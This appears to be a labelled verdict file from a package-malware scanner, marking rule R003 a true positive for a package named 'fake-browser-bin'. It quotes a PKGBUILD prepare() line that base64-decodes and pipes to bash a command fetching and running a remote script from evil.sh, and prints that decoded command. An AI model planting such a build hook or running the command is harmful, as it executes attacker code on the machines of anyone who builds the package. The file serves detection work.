@@ -1,0 +1,41 @@
+{
+  "alert_slug": "historical/r003-tp",
+  "confidence": "high",
+  "overall": "TP",
+  "package": "fake-browser-bin",
+  "rules": [
+    {
+      "agree": true,
+      "bad_practice_present": true,
+      "citation": "PKGBUILD prepare() line (line 14): `echo 'Y3VybCAtcyBodHRwOi8vZXZpbC5zaC9zdGFnZTIgfCBiYXNo' | base64 -d | bash` \u2014 the payload decodes to `curl -s http://evil.sh/stage2 | bash`; also rule source line 5: \"R001 is 'a remote script is piped to a shell'.\"",
+      "cited": true,
+      "class": "true_positive",
+      "confidence": "high",
+      "ioc_entries": [
+        {
+          "confidence": "high",
+          "provenance": "the base64-decoded payload in PKGBUILD prepare()",
+          "type": "domain",
+          "value": "evil.sh"
+        }
+      ],
+      "malicious_behaviour_present": true,
+      "malicious_citation": "# prepare() { echo 'Y3VybCAtcyBodHRwOi8vZXZpbC5zaC9zdGFnZTIgfCBiYXNo' | base64 -d | bash; } \u2014 PKGBUILD line 14",
+      "malicious_citation_grounded": true,
+      "malicious_reasoning": "The runtime supplies a decoded payload (curl -s http://evil.sh/stage2 | bash), and the package's prepare() stage actually executes this during build: it decodes the base64 string and pipes it to bash, so curl runs against evil.sh at build time \u2014 a real hidden payload that runs code the package should not.",
+      "reasoning": "The base64-decoded content executes `curl -s http://evil.sh/stage2 | bash`, which fetches and runs an arbitrary remote script \u2014 a genuine fetch-and-exec malware pattern, not a benign packaging idiom. The pipe is unescaped, so R003 legitimately fires.",
+      "resolution": "Do not remediate this finding: it is a genuine match for R003, which detects base64-decoded payloads piped to a shell. The malicious behavior (curl http://evil.sh/stage2 | bash) must be treated as confirmed; do not mark the alert benign or suppress it.",
+      "rule_id": "R003",
+      "samples": [
+        [
+          "True",
+          "True"
+        ]
+      ],
+      "tp_twin": "A package whose PKGBUILD contains base64 -d piped to a shell that decodes to 'curl http://evil.sh/stage2 | bash'.",
+      "where": "src/trustsight/analysis/payload_signals.py"
+    }
+  ],
+  "score": 80,
+  "score_threshold": 20
+}
